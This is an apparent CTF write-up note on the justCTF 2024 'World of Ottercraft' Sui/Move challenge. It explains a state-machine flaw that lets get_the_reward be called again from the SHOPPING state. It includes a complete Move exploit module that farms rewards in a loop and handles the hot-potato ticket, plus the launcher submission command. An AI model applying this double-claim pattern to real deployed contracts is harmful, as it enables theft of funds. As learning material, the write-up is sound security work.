---
id: move-sui-state-machine-reclaim-reward
category: WEB
tags: [blockchain, sui, move, not-evm, state-machine, state-transition, reentrancy-equivalent, reclaim, double-claim, reward-farm, hot-potato, ticket, no-drop-ability, get_the_reward, shopping-state, justctf, world-of-ottercraft, ottersec, solve-module, hard]
tools: [Sui]
manuals: ["Manuals/Sui/3. Contexto para Claude.md"]
title: "Move/Sui — a claim reachable from an extra state = re-collect the reward in a loop (+ hot-potato ticket)"
difficulty: hard
created: 2026-10-08
updated: 2026-10-08
related: [move-sui-validated-index-vs-consumed-element, web3-reentrancy-checks-effects-interactions]
---

> ⚠️ **Sui** / **Move** chain (non-EVM). Toolchain = Sui CLI + Move (a `solve` module published by the
> launcher with the shared objects). See the note in
> `Arsenal/WEB/move-sui-validated-index-vs-consumed-element.md`. (`Manuals/Sui/` pending).

## How to recognize this pattern

- A contract with a **state machine** where each function only runs in certain states. Look for a
  **claim/reward/withdraw function reachable from one "extra" state** than it should be — there you can
  fire it repeatedly without redoing the work that was supposed to enable it (equivalent to reentrancy:
  re-executing the claim over the same "gain").
- In **Move** specifically: the purchase system uses a **hot-potato ticket** — `enter_tavern` returns a
  `struct` **with no abilities (no `drop`/`store`/`key`)**, which the compiler FORCES you to consume in
  a specific function (`checkout`). That forces you through `checkout` (which usually has a check like
  `total > 0` → you need to buy something). Understand the ticket flow before attacking.

## Method

Reference case: justCTF 2024 — World of Ottercraft (Sui/Move, Hard). States: `PREPARE_FOR_TROUBLE,
ON_ADVENTURE, RESTING, SHOPPING, FINISHED`. Key transitions:
```text
RESTING        -> enter_tavern -> SHOPPING
SHOPPING       -> buy_*
[ANY]          -> checkout     -> RESTING
(FINISHED, SHOPPING) -> get_the_reward -> RESTING     <-- get_the_reward also from SHOPPING!
```
The hole: `get_the_reward` accepts **SHOPPING** in addition to `FINISHED`. So after earning 1 legit
reward, you reenter `get_the_reward` from SHOPPING as many times as you want — re-collecting without
re-fighting. The hot-potato ticket forces a cheap `buy` (`buy_shield` = 20) to close the `checkout`
(`total>0`), but the per-monster reward (≥62) more than covers it.

### Exploit (`solve` module)

```move
module solve::solve {
    use challenge::Otter::{Self, OTTER};
    public fun solve(_board:&mut Otter::QuestBoard, _vault:&mut Otter::Vault<OTTER>,
                     _player:&mut Otter::Player, _ctx:&mut TxContext) {
        // 1) power to beat the monster (SHOPPING -> buy -> checkout)
        let mut ticket = Otter::enter_tavern(_player);
        Otter::buy_power_of_friendship(_player, &mut ticket);   // +9000 power
        Otter::checkout(ticket, _player, _ctx, _vault, _board);
        // 2) find monsters, fight #0, return -> FINISHED, 1 legit reward
        let mut i=0; while (i<20){ Otter::find_a_monster(_board,_player); i=i+1; };
        Otter::bring_it_on(_board,_player,0);
        Otter::return_home(_board,_player);
        Otter::get_the_reward(_vault,_board,_player,_ctx);
        // 3) re-collect in a loop via SHOPPING (cheap buy_shield closes the ticket)
        let mut j=0; while (j<10){
            let mut tick = Otter::enter_tavern(_player);
            Otter::buy_shield(_player, &mut tick);
            Otter::get_the_reward(_vault,_board,_player,_ctx);   // reenters from SHOPPING
            Otter::checkout(tick,_player,_ctx,_vault,_board);
            j=j+1;
        };
        // 4) buy the flag
        let mut t0 = Otter::enter_tavern(_player);
        Otter::buy_flag(&mut t0, _player);
        Otter::checkout(t0, _player, _ctx, _vault, _board);
    }
}
```
Compile (`sui move build`) and submit to the launcher (`nc woo.nc.jctf.pro 31337`) → flag.

## Gotchas

- **Map the state→function→state table first.** The bug is a sensitive function with ONE extra entry
  state. Compare each function's set of entry states against the "intended flow".
- **Hot-potato ticket:** a struct with no `drop` must be consumed → you're forced to call `checkout`.
  Read `checkout`'s checks (e.g. `total>0`) and find the cheapest item that satisfies them.
- You need **power** for `bring_it_on` (buy_power_of_friendship +9000); shield isn't enough to fight,
  only to close the ticket in the loop.
- Equivalent to EVM reentrancy (`web3-reentrancy-...`): the "effect" (reward) is re-executable because
  the state transition doesn't close the claim uniquely.

## Transferable lesson

In a state machine, list the entry states of EVERY value function (claim/withdraw/reward) and look for
an extra state that reopens the action. In Move, understand the hot-potato flow (who creates the ticket,
who consumes it, what check the consumption imposes) before building the chain.

## Related / Cross-reference

- `Arsenal/WEB/move-sui-validated-index-vs-consumed-element.md`,
  `move-sui-source-encoded-puzzle-input.md` — same Sui/Move set (justCTF 2024).
- `Arsenal/WEB/web3-reentrancy-checks-effects-interactions.md` — the EVM analog (re-executable claim).
